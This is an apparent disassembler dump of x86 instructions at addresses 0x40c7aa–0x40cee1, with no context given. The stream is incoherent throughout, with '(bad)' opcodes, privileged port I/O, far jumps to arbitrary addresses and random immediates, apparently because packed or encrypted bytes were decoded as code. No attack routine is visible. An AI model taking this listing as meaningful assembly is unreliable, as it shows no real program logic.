  40c7aa:	sub    ah,ch
  40c7ac:	pop    esp
  40c7ad:	dec    ecx
  40c7ae:	xchg   edi,eax
  40c7af:	mov    DWORD PTR [edx+esi*2],edx
  40c7b2:	mov    eax,0xa3c98536
  40c7b7:	cs jp  0x40c7c1
  40c7ba:	cmp    BYTE PTR [ecx+eiz*4+0x75],dh
  40c7be:	pop    ecx
  40c7bf:	mov    esp,0xc79c9e5
  40c7c4:	fadd   st,st(5)
  40c7c6:	xor    dh,bh
  40c7c8:	inc    esp
  40c7c9:	sub    bl,BYTE PTR [edx]
  40c7cb:	xor    dl,BYTE PTR [esi]
  40c7cd:	pop    edx
  40c7ce:	add    eax,esp
  40c7d0:	retf   0xdf03
  40c7d3:	mov    ch,0xb1
  40c7d5:	scas   eax,DWORD PTR es:[edi]
  40c7d6:	mov    ebp,0xc0e8dc6d
  40c7db:	adc    eax,DWORD PTR [ebx]
  40c7dd:	mov    esp,0x5bc6e924
  40c7e2:	xchg   esi,eax
  40c7e3:	jb     0x40c818
  40c7e5:	stos   BYTE PTR es:[edi],al
  40c7e6:	cdq    
  40c7e7:	xchg   edx,eax
  40c7e8:	sbb    BYTE PTR [edi+0x55],ah
  40c7eb:	mov    dh,0x95
  40c7ed:	push   cs
  40c7ee:	shr    DWORD PTR [ebp+0x47ebdf55],0xa9
  40c7f5:	mov    eax,ds:0x51b63a3b
  40c7fa:	cwde   
  40c7fb:	retf   0x7d9d
  40c7fe:	rcl    BYTE PTR [ecx-0x7da91bf7],1
  40c804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c805:	pop    es
  40c806:	shl    DWORD PTR [eax],0x21
  40c809:	lock pop ebp
  40c80b:	jge    0x40c838
  40c80d:	dec    ebx
  40c80e:	xchg   esi,eax
  40c80f:	jl     0x40c83e
  40c811:	mov    ecx,0x9d819776
  40c816:	sbb    BYTE PTR [edi-0xa],0x23
  40c81a:	loop   0x40c871
  40c81c:	test   eax,0x74d952b
  40c821:	shr    DWORD PTR [esi+0x5897ad6a],cl
  40c827:	dec    edi
  40c828:	imul   eax
  40c82a:	xchg   esp,eax
  40c82b:	icebp  
  40c82c:	iret   
  40c82d:	test   eax,0xc6f6bd6a
  40c832:	out    dx,eax
  40c833:	scas   eax,DWORD PTR es:[edi]
  40c834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c835:	popa   
  40c836:	xchg   edi,eax
  40c837:	stos   DWORD PTR es:[edi],eax
  40c838:	cwde   
  40c839:	pop    esi
  40c83a:	fisttp DWORD PTR ss:[esi]
  40c83d:	sahf   
  40c83e:	xor    BYTE PTR [esi+0x594645dd],bl
  40c844:	mov    esp,0xc35e7d7b
  40c849:	jb     0x40c844
  40c84b:	xlat   BYTE PTR ds:[ebx]
  40c84c:	addr16 test al,0x38
  40c84f:	div    DWORD PTR [ebx]
  40c851:	dec    edi
  40c852:	lods   eax,DWORD PTR ds:[esi]
  40c853:	inc    esi
  40c854:	out    0xc0,al
  40c856:	in     al,0x1d
  40c858:	cwde   
  40c859:	push   es
  40c85a:	shl    BYTE PTR [eax],1
  40c85c:	mov    ecx,0x57e8b42
  40c861:	dec    edx
  40c862:	xor    al,0x9e
  40c864:	sar    DWORD PTR fs:0x6bfc4c19,1
  40c86b:	adc    al,0xa
  40c86d:	mov    WORD PTR [ebx],gs
  40c86f:	(bad)  
  40c870:	arpl   WORD PTR [ecx+esi*8],si
  40c873:	scas   eax,DWORD PTR es:[edi]
  40c874:	cmp    esp,DWORD PTR [edi+0x37]
  40c877:	test   DWORD PTR [eax+ecx*8+0x509fa71b],eax
  40c87e:	rcl    BYTE PTR [ebx+ecx*4-0x6b],0x1
  40c883:	sub    al,0x9a
  40c885:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40c887:	icebp  
  40c888:	fsubp  st(6),st
  40c88a:	sbb    eax,0xfc068eb
  40c88f:	stos   DWORD PTR es:[edi],eax
  40c890:	icebp  
  40c891:	aad    0xb
  40c893:	mov    bh,0x60
  40c895:	inc    edx
  40c896:	(bad)  
  40c897:	loop   0x40c8ee
  40c899:	mov    ah,bh
  40c89b:	jmp    0xcb8:0xcf2fef0b
  40c8a2:	gs sbb al,0xcc
  40c8a5:	aas    
  40c8a6:	repz enter 0x438d,0x77
  40c8ab:	cli    
  40c8ac:	iret   
  40c8ad:	jo     0x40c86a
  40c8af:	aaa    
  40c8b0:	jne    0x40c897
  40c8b2:	mov    dl,0x17
  40c8b4:	scas   al,BYTE PTR es:[edi]
  40c8b5:	mov    DWORD PTR [edx],esi
  40c8b7:	xchg   BYTE PTR [edx+0x64],cl
  40c8ba:	mov    ds:0x7d53baad,eax
  40c8bf:	jno    0x40c93e
  40c8c1:	je     0x40c87e
  40c8c3:	call   DWORD PTR [edi+0x4e]
  40c8c6:	shl    BYTE PTR [esi],0x79
  40c8c9:	push   esi
  40c8ca:	mov    edx,0x88362b54
  40c8cf:	shl    BYTE PTR ds:0xe38fe73,0x92
  40c8d6:	cld    
  40c8d7:	mov    bh,0x7f
  40c8d9:	daa    
  40c8da:	push   cs
  40c8db:	aad    0xe7
  40c8dd:	out    0x2,eax
  40c8df:	rol    bl,cl
  40c8e1:	popf   
  40c8e2:	adc    eax,0x30875953
  40c8e7:	or     al,0xbf
  40c8e9:	mov    ds:0xb686e8a8,eax
  40c8ee:	sti    
  40c8ef:	dec    ebp
  40c8f0:	sti    
  40c8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8f2:	jg     0x40c8c4
  40c8f4:	jbe    0x40c91e
  40c8f6:	repz xchg esi,eax
  40c8f8:	test   eax,0x50251b14
  40c8fd:	loope  0x40c8d6
  40c8ff:	dec    ebx
  40c900:	mov    DWORD PTR [eax-0x35],ecx
  40c903:	sub    al,0xb8
  40c905:	cli    
  40c906:	cmp    dl,BYTE PTR [ecx+0x2bc31ada]
  40c90c:	mov    WORD PTR [eax],gs
  40c90e:	or     DWORD PTR [eax-0x44865d90],esp
  40c914:	xor    BYTE PTR [ebp+ebp*1-0x16],0x5a
  40c919:	icebp  
  40c91a:	ret    
  40c91b:	jl     0x40c90e
  40c91d:	in     al,dx
  40c91e:	mov    edx,0x25234272
  40c923:	cmp    eax,0x2e52928c
  40c928:	in     eax,dx
  40c929:	(bad)  
  40c92a:	hlt    
  40c92b:	mov    ds:0x8c6a7188,eax
  40c930:	pop    ebp
  40c931:	xor    eax,0x6e5f091a
  40c936:	es xchg esp,eax
  40c938:	lock fs jno 0x40c908
  40c93c:	rcr    BYTE PTR [esi+0x32b3e0d3],1
  40c942:	mov    ebx,0xee66ad8f
  40c947:	aam    0x16
  40c949:	sub    al,0x3a
  40c94b:	and    al,0xda
  40c94d:	imul   edx,DWORD PTR ds:0x54f70553,0x64518f5
  40c957:	gs dec ebp
  40c959:	add    eax,0x35b521ae
  40c95e:	mov    esi,0xb50689cf
  40c963:	test   DWORD PTR [eax],esi
  40c965:	mov    eax,0xf85fe1fb
  40c96a:	mov    BYTE PTR [ebx],0x6d
  40c96d:	cwde   
  40c96e:	mov    esp,0x7059411b
  40c973:	and    edi,edx
  40c975:	and    al,BYTE PTR [ecx+0x23]
  40c978:	fdiv   st,st(3)
  40c97a:	into   
  40c97b:	(bad)  
  40c97c:	in     al,0x61
  40c97e:	ret    0xb0a8
  40c981:	in     al,dx
  40c982:	fild   QWORD PTR [ebx]
  40c984:	pop    eax
  40c985:	data16 das 
  40c987:	mov    BYTE PTR [eax],bl
  40c989:	test   DWORD PTR [eax],ebx
  40c98b:	pusha  
  40c98c:	ins    BYTE PTR es:[edi],dx
  40c98d:	ror    DWORD PTR [edi+0x2a],1
  40c990:	stos   BYTE PTR es:[edi],al
  40c991:	cmp    BYTE PTR [edi],bl
  40c993:	inc    ebx
  40c994:	pop    esi
  40c995:	jmp    0x40c979
  40c997:	jmp    0x5c10745
  40c99c:	jp     0x40c995
  40c99e:	rol    esi,cl
  40c9a0:	adc    al,0x3c
  40c9a2:	xchg   BYTE PTR [edx-0x646e1125],dl
  40c9a8:	outs   dx,BYTE PTR ds:[esi]
  40c9a9:	xchg   BYTE PTR [edx-0x42487d2e],dl
  40c9af:	push   ebx
  40c9b0:	int3   
  40c9b1:	outs   dx,BYTE PTR ds:[esi]
  40c9b2:	push   ss
  40c9b3:	mov    esi,eax
  40c9b5:	push   eax
  40c9b6:	imul   edx
  40c9b8:	jmp    0x9c0f284b
  40c9bd:	jge    0x40c952
  40c9bf:	loop   0x40ca31
  40c9c1:	(bad)  
  40c9c2:	push   ebp
  40c9c3:	mov    bl,0x56
  40c9c5:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9c7:	leave  
  40c9c8:	mov    ds:0xc1559f11,eax
  40c9cd:	or     esi,esp
  40c9cf:	(bad)  [ecx+ecx*1-0x50]
  40c9d3:	sub    ebp,DWORD PTR [edx-0x111443c4]
  40c9d9:	jmp    0x40c9f0
  40c9db:	loope  0x40c9f3
  40c9dd:	add    al,0x0
  40c9df:	or     DWORD PTR [esi+0x55feacb3],0xf4b6ca43
  40c9e9:	int    0xeb
  40c9eb:	enter  0x7dbb,0x6a
  40c9ef:	out    0xac,eax
  40c9f1:	xor    DWORD PTR [edx-0x5d2c730e],esi
  40c9f7:	cdq    
  40c9f8:	xchg   edx,eax
  40c9f9:	pop    ebx
  40c9fa:	jge    0x40ca12
  40c9fc:	cmp    DWORD PTR [edx+0x385e05dd],0xffffffba
  40ca03:	lea    edi,[edx+0x2e]
  40ca06:	mov    al,0x37
  40ca08:	jl     0x40c9a8
  40ca0a:	cmp    cl,BYTE PTR [eax+0x7a9a0290]
  40ca10:	retf   
  40ca11:	xchg   edx,eax
  40ca12:	(bad)  
  40ca13:	rcr    edi,0x47
  40ca16:	adc    BYTE PTR [ecx],dl
  40ca18:	and    al,0x81
  40ca1a:	aaa    
  40ca1b:	rol    esp,cl
  40ca1d:	std    
  40ca1e:	pop    ecx
  40ca1f:	push   cs
  40ca20:	jae    0x40c9ac
  40ca22:	and    eax,0xbec91424
  40ca27:	dec    eax
  40ca28:	dec    ecx
  40ca29:	fs mov esi,0x5bbe0e6
  40ca2f:	in     eax,0xcc
  40ca31:	add    BYTE PTR [edi],ch
  40ca33:	jb     0x40ca0e
  40ca35:	push   edi
  40ca36:	jle    0x40c9e3
  40ca38:	sub    eax,ebx
  40ca3a:	not    DWORD PTR fs:[ecx+edi*2-0x40ef119]
  40ca42:	push   esp
  40ca43:	mov    eax,0x8e0d019f
  40ca48:	push   cs
  40ca49:	adc    BYTE PTR [edi],0xb9
  40ca4c:	sub    al,ch
  40ca4e:	int    0xd5
  40ca50:	jb     0x40ca09
  40ca52:	loope  0x40ca60
  40ca54:	xor    ah,BYTE PTR [edx]
  40ca56:	mov    ebp,edi
  40ca58:	imul   ecx,DWORD PTR [edi+esi*2],0xaf7d1e80
  40ca5f:	pop    edi
  40ca60:	or     ebp,ebx
  40ca62:	add    BYTE PTR [ebp+0x15],0x23
  40ca66:	mov    dh,0xd7
  40ca68:	test   esi,eax
  40ca6a:	setl   bh
  40ca6d:	and    BYTE PTR [esp+ecx*1+0x62bfe48a],0x72
  40ca75:	out    0xc4,ax
  40ca78:	fwait
  40ca79:	and    al,0xf6
  40ca7b:	sub    ah,BYTE PTR [esi]
  40ca7d:	jb     0x40cacd
  40ca7f:	sub    ebp,DWORD PTR [bx+si+0x5e]
  40ca83:	pushf  
  40ca84:	nop
  40ca85:	fcmovu st,st(0)
  40ca87:	stos   BYTE PTR es:[edi],al
  40ca88:	test   DWORD PTR [ecx-0x62],esp
  40ca8b:	aaa    
  40ca8c:	adc    ebx,DWORD PTR [edx+0x41]
  40ca8f:	outs   dx,BYTE PTR ds:[esi]
  40ca90:	sahf   
  40ca91:	(bad)  
  40ca92:	push   0x1a
  40ca94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca95:	xor    ebp,esi
  40ca97:	stos   DWORD PTR es:[edi],eax
  40ca98:	push   edx
  40ca99:	in     al,dx
  40ca9a:	loope  0x40caba
  40ca9c:	jns    0x40ca77
  40ca9e:	js     0x40caab
  40caa0:	push   ecx
  40caa1:	cld    
  40caa2:	psubsb mm0,QWORD PTR [ebx-0x40]
  40caa6:	sub    dh,dl
  40caa8:	xor    DWORD PTR [esi],0xffffff8e
  40caab:	mov    dl,0xfd
  40caad:	mov    dl,0x4a
  40caaf:	dec    eax
  40cab0:	outs   dx,DWORD PTR ds:[esi]
  40cab1:	ror    edx,cl
  40cab3:	dec    ecx
  40cab4:	loopne 0x40ca7d
  40cab6:	call   0xbf9a76ca
  40cabb:	test   cl,dh
  40cabd:	pop    ss
  40cabe:	sar    DWORD PTR [ebp-0x28c0623e],0x87
  40cac5:	adc    DWORD PTR [eax],0x7452bf4c
  40cacb:	jno    0x40cada
  40cacd:	sub    BYTE PTR [edi+0x71ffae14],al
  40cad3:	jne    0x40ca6b
  40cad5:	shr    DWORD PTR [edx-0x10eed512],0x49
  40cadc:	inc    ecx
  40cadd:	sub    BYTE PTR [edi],dh
  40cadf:	push   0x86dc37fb
  40cae4:	stos   BYTE PTR es:[edi],al
  40cae5:	idiv   edi
  40cae7:	pop    ds
  40cae8:	push   esp
  40cae9:	je     0x40cb63
  40caeb:	add    DWORD PTR [edi],ebx
  40caed:	addr16 push ds
  40caef:	pop    eax
  40caf0:	jg     0x40cad5
  40caf2:	dec    eax
  40caf3:	mov    es,ebx
  40caf5:	jb     0x40cb0f
  40caf7:	call   0x38b2:0x5a5c5ea
  40cafe:	hlt    
  40caff:	retf   
  40cb00:	adc    DWORD PTR [ebp+0x63fceac2],ecx
  40cb06:	sub    al,0x49
  40cb08:	stos   DWORD PTR es:[edi],eax
  40cb09:	in     eax,dx
  40cb0a:	mov    dl,0x21
  40cb0c:	fist   WORD PTR [ecx]
  40cb0e:	mov    ebx,0xb29bbbf3
  40cb13:	mov    edi,0x64f04759
  40cb18:	inc    eax
  40cb19:	inc    ebx
  40cb1a:	cs retf 
  40cb1c:	loop   0x40cab7
  40cb1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb1f:	sub    ecx,esi
  40cb21:	sub    esp,DWORD PTR [ecx-0x3]
  40cb24:	and    BYTE PTR [ebx+0x7ba99534],dl
  40cb2a:	sub    edi,DWORD PTR [edi]
  40cb2c:	adc    al,0x1a
  40cb2e:	(bad)  
  40cb2f:	rol    DWORD PTR [ebx-0x5d],1
  40cb32:	mov    BYTE PTR ds:0xd4fcec8a,bl
  40cb38:	es ret 
  40cb3a:	push   esi
  40cb3b:	pop    eax
  40cb3c:	call   0x2b84:0xdca4d5c7
  40cb43:	inc    BYTE PTR [ebx]
  40cb45:	int3   
  40cb46:	neg    BYTE PTR [ebx]
  40cb48:	out    dx,al
  40cb49:	mov    ds:0x3c8d8bf4,al
  40cb4e:	inc    ecx
  40cb4f:	ss gs fs push ss
  40cb53:	or     eax,0x1b67360e
  40cb58:	ret    
  40cb59:	sbb    esi,DWORD PTR [ecx]
  40cb5b:	cli    
  40cb5c:	push   edx
  40cb5d:	rcl    edx,0x9
  40cb60:	loop   0x40cbdb
  40cb62:	dec    esi
  40cb63:	popa   
  40cb64:	add    DWORD PTR [ebx],esi
  40cb66:	jbe    0x40cb71
  40cb68:	stos   DWORD PTR es:[edi],eax
  40cb69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb6a:	sar    cl,cl
  40cb6c:	dec    esp
  40cb6d:	rol    ah,1
  40cb6f:	int3   
  40cb70:	or     BYTE PTR [esi-0x75c7c7ef],ch
  40cb76:	mov    ebx,0x7513fc6a
  40cb7b:	adc    ah,BYTE PTR [eax+0x4a9a5a84]
  40cb81:	fdiv   QWORD PTR [ebp+0x2c]
  40cb84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb85:	add    al,0x9f
  40cb87:	inc    esi
  40cb88:	inc    esi
  40cb89:	call   0x7c79:0x940fdc62
  40cb90:	and    al,0xe
  40cb92:	xor    al,0x23
  40cb94:	pop    esi
  40cb95:	dec    ebp
  40cb96:	add    BYTE PTR [esi+0x5c],bl
  40cb99:	pop    esi
  40cb9a:	ss jae 0x40cb3f
  40cb9d:	xchg   edi,eax
  40cb9e:	in     al,0xdc
  40cba0:	mov    edi,0x968bb405
  40cba5:	add    al,0xf5
  40cba7:	ja     0x40cb51
  40cba9:	retf   
  40cbaa:	xchg   ebx,eax
  40cbab:	or     eax,DWORD PTR [ebx]
  40cbad:	fcmovb st,st(5)
  40cbaf:	mov    eax,ds:0x99f63996
  40cbb4:	aam    0x4f
  40cbb6:	popa   
  40cbb7:	jo     0x40cbf0
  40cbb9:	imul   edi,DWORD PTR ss:[edi-0x2c],0x51
  40cbbe:	inc    ebx
  40cbbf:	mov    edx,0x69da47f9
  40cbc4:	pop    ebp
  40cbc5:	mov    ecx,0xf4096795
  40cbca:	outs   dx,BYTE PTR ds:[esi]
  40cbcb:	stos   BYTE PTR es:[edi],al
  40cbcc:	inc    esi
  40cbcd:	addr16 mov edi,0xb6790e72
  40cbd3:	add    dh,BYTE PTR [ecx+0x55b5b61b]
  40cbd9:	and    ebp,esi
  40cbdb:	sub    esp,eax
  40cbdd:	int3   
  40cbde:	adc    al,0x6a
  40cbe0:	mov    eax,ds:0x3a488671
  40cbe5:	int    0x58
  40cbe7:	sbb    dl,BYTE PTR [edx+edi*8+0x75]
  40cbeb:	sbb    dl,BYTE PTR [edi]
  40cbed:	jecxz  0x40cbe4
  40cbef:	adc    BYTE PTR [ebx+0x2cc70b31],ah
  40cbf5:	inc    edx
  40cbf6:	xor    DWORD PTR [esi+0x14],edx
  40cbf9:	inc    edi
  40cbfa:	call   0x2cf5e068
  40cbff:	mov    ecx,0xdcea36e5
  40cc04:	inc    esi
  40cc05:	mov    WORD PTR [ecx-0x48893254],es
  40cc0b:	mov    ds:0xfb89bbb,al
  40cc10:	lods   al,BYTE PTR ds:[esi]
  40cc11:	es scas eax,DWORD PTR es:[di]
  40cc14:	jge    0x40cbcb
  40cc16:	(bad)  
  40cc17:	jnp    0x40cc65
  40cc19:	dec    eax
  40cc1a:	shl    ebp,0x7a
  40cc1d:	and    ecx,DWORD PTR [esi]
  40cc1f:	les    ebp,FWORD PTR [ecx]
  40cc21:	(bad)  
  40cc23:	jl     0x40cbf5
  40cc25:	mov    ch,0x34
  40cc27:	cmp    DWORD PTR [ebp-0x34ec7f66],edx
  40cc2d:	inc    edx
  40cc2e:	jnp    0x40cc71
  40cc30:	dec    edi
  40cc31:	bound  esi,QWORD PTR [ebx]
  40cc33:	xchg   ecx,eax
  40cc34:	js     0x40cbcd
  40cc36:	and    edi,DWORD PTR [edx+0x7acd0f34]
  40cc3c:	mov    edi,DWORD PTR ds:0x3f952bcf
  40cc42:	loopne 0x40cc6c
  40cc44:	inc    eax
  40cc45:	xchg   al,ch
  40cc47:	pop    ecx
  40cc48:	ret    
  40cc49:	add    BYTE PTR [esi],0x5d
  40cc4c:	popa   
  40cc4d:	addr16 popf 
  40cc4f:	mov    eax,0x5c9a169
  40cc54:	push   esp
  40cc55:	into   
  40cc56:	sub    eax,0xef31146f
  40cc5b:	jnp    0x40cc65
  40cc5d:	(bad)  
  40cc5e:	fstp   DWORD PTR [ebx-0x3f]
  40cc61:	xor    al,0x1f
  40cc63:	xor    ecx,esi
  40cc65:	push   esp
  40cc66:	cmp    bh,ah
  40cc68:	(bad)  
  40cc69:	mov    eax,0xdba006b6
  40cc6e:	shl    DWORD PTR [esi+esi*4-0x5ac657f],cl
  40cc75:	rol    WORD PTR [ebp-0x7aa91080],1
  40cc7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc7d:	sar    BYTE PTR [esi-0x4b],0x2d
  40cc81:	push   esi
  40cc82:	cmp    al,0x89
  40cc84:	repz (bad) 
  40cc86:	and    al,0xad
  40cc88:	(bad)  
  40cc89:	cs push 0x3e935def
  40cc8f:	ret    
  40cc90:	add    esi,edi
  40cc92:	push   ss
  40cc93:	mov    ebp,0xb6ebbd21
  40cc98:	inc    esp
  40cc99:	lea    ecx,[esi+eiz*2]
  40cc9c:	rcr    BYTE PTR [edi+0x31],0x65
  40cca0:	cmp    BYTE PTR [edx],0x2b
  40cca3:	xchg   DWORD PTR [edx-0x46484b30],esi
  40cca9:	pop    ss
  40ccaa:	inc    edi
  40ccab:	jl     0x40cc7e
  40ccad:	mov    edi,ss
  40ccaf:	mov    ds:0xaeba4103,al
  40ccb4:	inc    edi
  40ccb5:	dec    edi
  40ccb6:	std    
  40ccb7:	icebp  
  40ccb8:	pop    eax
  40ccb9:	in     al,dx
  40ccba:	(bad)  [edi-0x4e]
  40ccbd:	fistp  DWORD PTR [esi+0x6f]
  40ccc0:	out    dx,al
  40ccc1:	outs   dx,DWORD PTR ds:[esi]
  40ccc2:	push   ss
  40ccc3:	add    eax,0x50ab9638
  40ccc8:	push   esp
  40ccc9:	loop   0x40cd1a
  40cccb:	push   ebx
  40cccc:	cmp    BYTE PTR [eax-0x25],0xde
  40ccd0:	shr    ah,0x97
  40ccd3:	ins    DWORD PTR es:[edi],dx
  40ccd4:	test   BYTE PTR [esi+ecx*1],ah
  40ccd7:	or     DWORD PTR [ebx-0xf],0xbd25c752
  40ccde:	adc    bh,al
  40cce0:	pop    eax
  40cce1:	outs   dx,BYTE PTR ds:[esi]
  40cce2:	test   bl,al
  40cce4:	ret    
  40cce5:	adc    eax,0x98f86b9d
  40ccea:	popf   
  40cceb:	mov    edx,0x90ea87f6
  40ccf0:	xchg   ecx,eax
  40ccf1:	sbb    al,0x46
  40ccf3:	(bad)  
  40ccf4:	cwde   
  40ccf5:	mov    dl,0xfd
  40ccf7:	pop    edi
  40ccf8:	repnz shl DWORD PTR [esi+esi*4-0x21],0x93
  40ccfe:	gs repz retf 0x5bd6
  40cd03:	adc    ebx,edx
  40cd05:	xor    DWORD PTR [eax+0x74],esi
  40cd08:	pop    eax
  40cd09:	jmp    0x40cd00
  40cd0b:	mov    ds:0xcfa83b9f,al
  40cd10:	mov    eax,ds:0x354ed235
  40cd15:	inc    esp
  40cd16:	popa   
  40cd17:	adc    BYTE PTR [edx],cl
  40cd19:	xor    BYTE PTR [esi+0x523eff79],0xb3
  40cd20:	lea    eax,[eax+0x485b695f]
  40cd26:	inc    ecx
  40cd27:	adc    esp,ebp
  40cd29:	(bad)  
  40cd2a:	aad    0x78
  40cd2c:	out    0x5f,al
  40cd2e:	test   DWORD PTR [edx+0x79],esi
  40cd31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd32:	sub    ebx,0x5a
  40cd35:	mov    al,ds:0xb826e928
  40cd3a:	test   DWORD PTR [ecx],edx
  40cd3c:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd3e:	xor    ecx,edi
  40cd40:	pop    ds
  40cd41:	adc    al,0x82
  40cd43:	and    ch,al
  40cd45:	mov    ds:0x38c5dae2,eax
  40cd4a:	pop    ds
  40cd4b:	out    dx,al
  40cd4c:	or     eax,0x3a0f1d5e
  40cd51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd52:	repz fs call 0xe670:0x1286f620
  40cd5b:	bound  esi,QWORD PTR [eax]
  40cd5d:	cmp    esi,DWORD PTR [ebx+eax*8-0x5148fca0]
  40cd64:	add    esp,ecx
  40cd66:	neg    BYTE PTR [edi-0x76]
  40cd69:	mov    BYTE PTR [esi-0x51dd1fb9],ch
  40cd6f:	xor    eax,0xf291282
  40cd74:	lea    edi,[edi+0x66]
  40cd77:	hlt    
  40cd78:	jmp    0x1ff276aa
  40cd7d:	mov    bl,0x19
  40cd7f:	add    DWORD PTR [ebx-0x67fd8095],ebp
  40cd85:	clc    
  40cd86:	out    dx,al
  40cd87:	pop    ss
  40cd88:	cmp    dh,BYTE PTR [ebx]
  40cd8a:	sub    cl,BYTE PTR [ecx+0x77]
  40cd8d:	out    dx,al
  40cd8e:	retf   
  40cd8f:	arpl   WORD PTR [ebx-0x16],bp
  40cd92:	into   
  40cd93:	jle    0x40cda2
  40cd95:	clc    
  40cd96:	sub    eax,0x8344ce47
  40cd9b:	lods   eax,DWORD PTR ds:[esi]
  40cd9c:	sbb    BYTE PTR [ecx+0x3152028c],0x5
  40cda3:	or     DWORD PTR [eax+0x58a0708a],0x6b
  40cdaa:	das    
  40cdab:	ins    DWORD PTR es:[edi],dx
  40cdac:	xchg   BYTE PTR [esi-0x3f],dl
  40cdaf:	scas   al,BYTE PTR es:[edi]
  40cdb0:	loope  0x40cd35
  40cdb2:	add    eax,0x6a14dec7
  40cdb7:	call   0xc962:0xe2dc6ab2
  40cdbe:	xchg   ebx,eax
  40cdbf:	rol    BYTE PTR [esi-0x76],cl
  40cdc2:	cmp    DWORD PTR [esi],ebp
  40cdc4:	fdivr  QWORD PTR [edi]
  40cdc6:	mov    ch,0x10
  40cdc8:	pop    eax
  40cdc9:	mov    BYTE PTR [ecx+0x0],cl
  40cdcc:	or     eax,0xb004e574
  40cdd1:	mov    bh,0xc4
  40cdd3:	and    BYTE PTR [edi-0x4d],ah
  40cdd6:	xor    al,0x54
  40cdd8:	or     al,0x3a
  40cdda:	add    dh,BYTE PTR [edi+edi*2-0x1e]
  40cdde:	gs xchg ebp,eax
  40cde0:	push   ecx
  40cde1:	test   al,0x85
  40cde3:	cmp    eax,DWORD PTR [edi-0x38644846]
  40cde9:	push   esp
  40cdea:	jge    0x40ce19
  40cdec:	dec    edi
  40cded:	(bad)  
  40cdee:	stc    
  40cdef:	sbb    BYTE PTR [edi-0x5],bl
  40cdf2:	out    0xb7,eax
  40cdf4:	(bad)  
  40cdf5:	cwde   
  40cdf6:	mov    al,0x5
  40cdf8:	jne    0x40ce47
  40cdfa:	dec    ebp
  40cdfb:	inc    edi
  40cdfc:	icebp  
  40cdfd:	or     ebp,DWORD PTR [edi+0xa]
  40ce00:	jle    0x40ce7f
  40ce02:	dec    edx
  40ce03:	aaa    
  40ce04:	push   esp
  40ce05:	inc    esi
  40ce06:	mov    edi,0xf2c8068d
  40ce0b:	push   esi
  40ce0c:	js     0x40ce10
  40ce0e:	pusha  
  40ce0f:	jb     0x40cdcb
  40ce11:	or     bh,dl
  40ce13:	fwait
  40ce14:	mov    ecx,0xc1d7d354
  40ce19:	ror    DWORD PTR [edx-0x47],cl
  40ce1c:	dec    edi
  40ce1d:	aad    0xf8
  40ce1f:	cmp    DWORD PTR [edi-0x3f],esi
  40ce22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce23:	sub    eax,0x7b2624c2
  40ce28:	sahf   
  40ce29:	addr16 (bad) 
  40ce2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce2c:	cmp    DWORD PTR [ebx+0x3822f451],eax
  40ce32:	inc    esi
  40ce33:	xor    BYTE PTR [ecx-0x5e444d4c],dh
  40ce39:	jge    0x40ce55
  40ce3b:	outs   dx,BYTE PTR ds:[esi]
  40ce3c:	mov    edx,0xcd8b90d6
  40ce41:	push   es
  40ce42:	xchg   edx,eax
  40ce43:	and    ebp,DWORD PTR [eax+0x59]
  40ce46:	pop    es
  40ce47:	jmp    DWORD PTR [ecx+0x3b9beff7]
  40ce4d:	imul   eax,DWORD PTR [ebx+0xb276fd8],0xffffffca
  40ce54:	je     0x40cdeb
  40ce56:	mov    esi,0xd2693759
  40ce5b:	push   cs
  40ce5c:	leave  
  40ce5d:	inc    ebp
  40ce5e:	cs ja  0x40ce73
  40ce61:	les    edx,FWORD PTR [ecx]
  40ce63:	mov    WORD PTR [edi+0x72],fs
  40ce66:	sar    DWORD PTR [eax],1
  40ce68:	mov    WORD PTR ds:0x714f4dd0,cs
  40ce6e:	ds int3 
  40ce70:	push   ebx
  40ce71:	cli    
  40ce72:	push   es
  40ce73:	xchg   esi,eax
  40ce74:	fmul   st(0),st
  40ce76:	jno    0x40ce7e
  40ce78:	enter  0x6430,0x68
  40ce7c:	cwde   
  40ce7d:	fwait
  40ce7e:	jb     0x40ceb1
  40ce80:	xchg   DWORD PTR [edi],esi
  40ce82:	mov    dh,0xed
  40ce84:	lock test al,0x2
  40ce87:	sub    eax,0xffb45ffe
  40ce8c:	or     eax,0x64ee3e24
  40ce91:	outs   dx,DWORD PTR ds:[esi]
  40ce92:	imul   ebx,DWORD PTR [edx-0x23eff242],0x349b3ead
  40ce9c:	cli    
  40ce9d:	(bad)  
  40ce9e:	fldenv [esi+0x2a]
  40cea1:	pop    ds
  40cea2:	fst    DWORD PTR [ebx-0x1]
  40cea5:	jmp    0x8ec2d17d
  40ceaa:	push   ss
  40ceab:	push   0x17
  40cead:	inc    esi
  40ceae:	cdq    
  40ceaf:	inc    esi
  40ceb0:	inc    eax
  40ceb1:	and    edi,edx
  40ceb3:	in     eax,0x80
  40ceb5:	lahf   
  40ceb6:	fs jb  0x40cedd
  40ceb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceba:	imul   edi,edi,0xd2194583
  40cec0:	or     esi,esp
  40cec2:	xchg   DWORD PTR [edi-0x56],edx
  40cec5:	leave  
  40cec6:	(bad)  
  40cec7:	or     cl,BYTE PTR [eax-0x61]
  40ceca:	jmp    0x53af6a14
  40cecf:	int3   
  40ced0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ced1:	cmp    DWORD PTR [edi],esi
  40ced3:	inc    ecx
  40ced4:	gs inc esp
  40ced6:	push   ecx
  40ced7:	in     eax,dx
  40ced8:	ds xchg esp,eax
  40ceda:	inc    esp
  40cedb:	xor    eax,DWORD PTR [esi-0x6b]
  40cede:	test   al,0xab
  40cee0:	daa    
  40cee1:	cs push ebp
